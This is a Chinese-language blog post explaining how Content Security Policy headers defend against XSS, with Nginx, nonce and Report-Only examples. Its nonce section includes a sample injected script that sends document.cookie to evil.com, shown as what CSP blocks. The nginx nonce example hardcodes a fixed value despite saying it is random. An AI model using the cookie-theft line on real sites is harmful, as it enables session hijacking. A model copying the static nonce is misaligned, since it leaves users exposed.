---
title: "Content Security Policy：防御 XSS 的强力武器"
date: 2018-11-27 10:19:48
tags:
  - 安全
readingTime: 1
description: "配置了 CSP 之后，即使 XSS 注入成功，攻击者也无法外链或执行恶意脚本。"
---

配置了 CSP 之后，即使 XSS 注入成功，攻击者也无法外链或执行恶意脚本。

## 什么是 CSP

Content Security Policy 是 HTTP 响应头，告诉浏览器哪些资源可以加载和执行：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'
```

浏览器会拒绝所有不符合策略的资源加载，包括内联脚本。

## 常用指令

```http
# 默认策略（所有未指定的资源类型）
default-src 'self'

# 脚本来源
script-src 'self' https://cdn.jsdelivr.net

# 样式来源
style-src 'self' 'unsafe-inline'    # 允许内联样式（不得不）

# 图片来源
img-src 'self' data: https:        # data: 允许 base64，https: 允许所有 https

# 字体
font-src 'self' https://fonts.gstatic.com

# AJAX/WebSocket 请求
connect-src 'self' https://api.example.com wss://ws.example.com

# 不允许在 iframe 中被嵌入（防止点击劫持）
frame-ancestors 'none'

# 上报违规（不拦截，只上报）
report-uri /csp-violation-report
```

## Nginx 配置

```nginx
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

## nonce 方式处理内联脚本

不想用 `unsafe-inline` 又需要内联脚本，可以用 nonce：

```nginx
# 每次请求生成随机 nonce
set $nonce "xK2TnVqD8sP3mR7";
add_header Content-Security-Policy "script-src 'self' 'nonce-$nonce'";
```

```html
<!-- 只有带正确 nonce 的内联脚本才会执行 -->
<script nonce="xK2TnVqD8sP3mR7">
  // 这段脚本可以执行
  var config = { apiUrl: "..." };
</script>

<!-- 攻击者注入的脚本没有 nonce，不会执行 -->
<script>
  fetch("https://evil.com?cookie=" + document.cookie);
</script>
```

## 先用 Report-Only 模式试水

直接上 CSP 可能会阻断正常功能，先用 Report-Only 观察：

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

不拦截，只把违规报告发到 `/csp-report`，方便调试。

```javascript
// 接收 CSP 违规报告
app.post(
  "/csp-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    console.log("CSP 违规:", req.body);
    // 存到日志系统分析
    res.status(204).end();
  },
);
```

## 常见的 CSP 兼容问题

- `eval()`：被 `script-src` 的 `unsafe-eval` 控制，webpack 的某些用法会用到
- 内联事件处理：`<button onclick="...">` 被阻止，改成 addEventListener
- `<base>` 标签：影响相对 URL 解析，受 `base-uri` 控制

## 小结

- CSP 是防御 XSS 的最后一道防线，即使注入了脚本也无法执行
- 先用 `Report-Only` 模式，收集违规后再正式开启
- nonce 比 `unsafe-inline` 更安全
- `frame-ancestors: none` 同时防止点击劫持
